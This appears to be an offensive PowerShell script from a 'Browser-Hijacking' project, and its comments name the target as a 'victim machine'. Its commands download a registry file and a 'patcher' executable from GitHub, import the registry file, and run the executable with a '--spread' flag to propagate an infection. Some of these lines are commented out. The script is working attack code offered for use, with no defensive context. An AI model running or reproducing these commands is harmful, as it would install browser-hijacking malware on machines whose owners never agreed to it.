# Download reg file and store on victim machine:
powershell -command "&{(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/icesonata/Browser-Hijacking/main/ieconf.reg?token=ALZQ6ESZF7MH6AW7VIFJELTBAE3UO', '$env:tmp/ieconf.reg')}"

# Download exe file for patching the infected file
# powershell -command "&{(new-object System.Net.WebClient).DownloadFile('https://github.com/icesonata/Browser-Hijacking/blob/main/patcher_v67.exe?raw=true', '$env:temp/patcher.exe')}"

# Import reg file into registry
#powershell -command "&{reg import $env:temp\\ieconf.reg}"

# Execute patching file
powershell -command "&{. $env:temp\\patcher.exe --spread (Get-Item .).FullName}"

# Ultimate (testing)
powershell -command "&{(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/icesonata/Browser-Hijacking/main/ieconf.reg?token=ALZQ6ESZF7MH6AW7VIFJELTBAE3UO', '$env:tmp/ieconf.reg'); }"